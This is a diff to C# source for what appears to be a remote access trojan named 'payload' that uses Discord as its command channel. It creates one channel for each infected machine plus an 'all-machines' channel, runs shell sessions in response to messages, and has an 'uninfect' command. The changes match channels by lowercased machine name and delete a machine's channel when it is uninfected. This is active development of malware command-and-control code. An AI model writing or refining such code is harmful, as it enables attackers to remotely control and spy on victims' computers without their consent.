@@ -25,7 +25,6 @@ namespace payload
     internal class Program
     {
         private static DiscordSocketClient client;
-        private static ulong channelid;
         private static string prefix;
 
         private static List<string> geolock = new List<string>();
@@ -69,9 +68,7 @@ namespace payload
         {
             foreach (SocketGuild g in client.Guilds)
             {
-                SocketChannel channel = g.Channels.SingleOrDefault(x => x.Name == Environment.MachineName);
-                if (channel == null) channelid = (await g.CreateTextChannelAsync(Environment.MachineName)).Id;
-                else channelid = channel.Id;
+                if (g.Channels.SingleOrDefault(x => x.Name == Environment.MachineName.ToLower()) == null) await g.CreateTextChannelAsync(Environment.MachineName.ToLower());
                 if (g.Channels.SingleOrDefault(x => x.Name == "all-machines") == null) await g.CreateTextChannelAsync("all-machines");
             }
         }
@@ -79,7 +76,7 @@ namespace payload
         private static async Task MessageReceived(SocketMessage message)
         {
             if (message.Author.Id == client.CurrentUser.Id) return;
-            if (message.Channel.Id != channelid && message.Channel.Name != "all-machines") return;
+            if (message.Channel.Name != Environment.MachineName.ToLower() && message.Channel.Name != "all-machines") return;
             if (message.Reference != null)
             {
                 foreach (Shell s in shellsInstances)
@@ -262,6 +259,7 @@ namespace payload
                 case "uninfect":
                     {
                         await message.Channel.SendMessageAsync($"Attempted to uninfect {Environment.MachineName}");
+                        if (message.Channel.Name != "all-machines") await (message.Channel as SocketTextChannel).DeleteAsync();
                         Utils.Uninfect();
                         break;
                     }
